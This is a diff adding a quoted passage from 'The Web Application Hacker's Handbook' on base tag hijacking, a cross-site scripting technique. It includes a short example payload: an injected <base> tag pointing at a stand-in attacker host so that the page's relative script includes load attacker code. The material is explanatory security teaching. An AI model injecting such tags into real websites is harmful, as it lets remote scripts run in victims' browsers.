@@ -1,0 +1,15 @@
+In some situations, you may be able to introduce new tags with various names but not find any means of using these to directly
+execute code. In these situations, you may be able to deliver an attack using a technique known as “base tag hijacking.” 
+The <base> tag is used to specify a URL that the browser should use to resolve any relative URLs that appear subsequently 
+within the page. If you can introduce a new <base> tag, and the page performs any <script> includes after your reflection 
+point using relative URLs, you can specify a base URL to a server that you control. When the browser loads the scripts 
+specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in 
+the context of the page that has invoked them. For example: 
+
+<base href="http://mdattacker.net/badscripts/">
+...
+<script src="goodscript.js"></script>
+ According to specifications, <base> tags should appear within the <head> section of the HTML page. However, some browsers, 
+ including Firefox, accept <base> tags appearing anywhere in the page, considerably widening the scope of this attack.
+
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12281-12295). Wiley. Kindle Edition. 
